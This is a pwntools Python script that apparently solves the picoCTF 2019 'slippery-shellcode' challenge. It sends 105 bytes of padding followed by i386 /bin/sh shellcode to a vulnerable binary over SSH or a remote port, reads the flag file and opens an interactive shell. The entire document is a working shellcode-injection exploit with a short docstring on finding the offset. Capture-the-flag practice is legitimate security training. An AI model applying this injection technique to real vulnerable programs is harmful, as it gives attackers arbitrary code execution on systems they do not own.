from pwn import *
import sys

host = '2019shell1.picoctf.com'
user = ''
password = ''
cwd = b'/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8'

def exploit(s):
    '''
    when input cyclic(500), execute b'baabcaab'
    find b'baabcaab' in cyclic(500) get 104
    therefore, pad b'a' * 105 before the code we want to execute
    '''
    s.sendlineafter(':', b'a' * 105 + asm(shellcraft.i386.linux.sh()))
    s.sendlineafter('$ ', b'cat ' + cwd + b'/flag.txt')
    s.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        ssh = ssh(host = host, user = user, password = password)
        #ssh.set_working_directory(cwd)
        s = ssh.process('./vuln', cwd = cwd)
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
